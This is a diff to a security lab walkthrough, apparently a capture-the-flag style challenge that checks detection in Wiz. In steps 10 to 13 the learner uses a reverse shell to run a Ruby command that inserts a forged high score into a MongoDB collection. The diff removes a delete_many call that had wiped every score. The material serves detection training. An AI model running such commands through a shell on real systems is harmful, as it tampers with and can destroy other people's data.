@@ -49,12 +49,12 @@ ruby -e "
 ```
 10. Ensure your final command looks like:
 ```ruby
-ruby -e "require 'mongo'; client = Mongo::Client.new(ENV['MONGODB_CONN']); db = client.use('game_db'); scores_collection = db[:player_scores]; scores_collection.delete_many({});  scores_collection.insert_one({\"player\":\"Alice\",\"score\":1000}); "
+ruby -e "require 'mongo'; client = Mongo::Client.new(ENV['MONGODB_CONN']); db = client.use('game_db'); scores_collection = db[:player_scores];  scores_collection.insert_one({\"player\":\"Alice\",\"score\":1000}); "
 ```
 
 11. Check the reverse shell is still active and run the command:
 ```bash
-ruby -e "require 'mongo'; client = Mongo::Client.new(ENV['MONGODB_CONN']); db = client.use('game_db'); scores_collection = db[:player_scores]; scores_collection.delete_many({});  scores_collection.insert_one({\"player\":\"Alice\",\"score\":1000}); "
+ruby -e "require 'mongo'; client = Mongo::Client.new(ENV['MONGODB_CONN']); db = client.use('game_db'); scores_collection = db[:player_scores]; scores_collection.insert_one({\"player\":\"Alice\",\"score\":1000}); "
 ```
 12. A successful execution will return a result similar to:
 ```bash
@@ -62,7 +62,7 @@ ruby -e "require 'mongo'; client = Mongo::Client.new(ENV['MONGODB_CONN']); db = 
 ```
 13. Browse to the webserver_IP and check your high score. 
 
-Congratulations, you've completed this challenge. Can you now find the command you executed in Wiz? How long did it take to appear in the console?
+Congratulations, you've completed this challenge. Can you now find the corresponding detection in Wiz? How long did it take to appear in the console?
 
 ### 💥 Hints & Tips
 
